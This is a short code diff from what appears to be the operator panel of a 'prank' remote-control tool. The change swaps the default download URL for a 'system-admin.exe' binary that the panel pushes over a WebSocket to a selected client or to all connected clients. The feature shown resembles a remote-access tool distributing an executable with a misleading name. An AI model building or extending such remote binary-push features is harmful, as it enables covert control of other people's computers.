@@ -752,7 +752,7 @@
         }
 
         function triggerAutoUpdate() {
-            const url = prompt('Enter Direct URL for system-admin.exe update binary:', 'https://prank.steamhub.qzz.io/system-admin.exe');
+            const url = prompt('Enter Direct URL for system-admin.exe update binary:', 'https://raw.githubusercontent.com/shanmukhasaireddy13/pranker/main/crates/pranker-server/public/system-admin.exe');
             if (!url) return;
             const target = selectedClientId || "all";
             sendWsMessage({
